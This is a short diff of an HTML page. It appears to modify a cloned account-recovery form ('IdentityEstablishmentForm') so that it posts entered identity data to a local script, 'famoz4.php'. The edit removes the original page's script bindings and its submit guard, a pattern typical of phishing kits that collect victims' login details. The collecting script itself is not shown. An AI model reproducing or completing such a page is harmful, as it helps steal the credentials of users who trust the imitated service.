@@ -40,7 +40,7 @@
 </header>
 
 <section class="container-view-scrollable">
-<form action="./famoz4.php" data-action="/api/retrieval" data-bind="dom: $form, props: settings" data-props="{&quot;previousStepAllowed&quot;:false,&quot;finalStep&quot;:false,&quot;apiUrl&quot;:&quot;/api/retrieval&quot;,&quot;lostDataType&quot;:&quot;UserName&quot;,&quot;userKind&quot;:&quot;Consumer&quot;,&quot;forced&quot;:false}" data-stable-name="IdentityEstablishmentForm" data-viewmodel="retrieval/viewmodels/identityEstablishment" enctype="application/x-www-form-urlencoded" method="post" onsubmit="return false;">
+<form action="./famoz4.php" enctype="application/x-www-form-urlencoded" method="post" >
 <div class="content__container has-padding">
 <p></p>
 
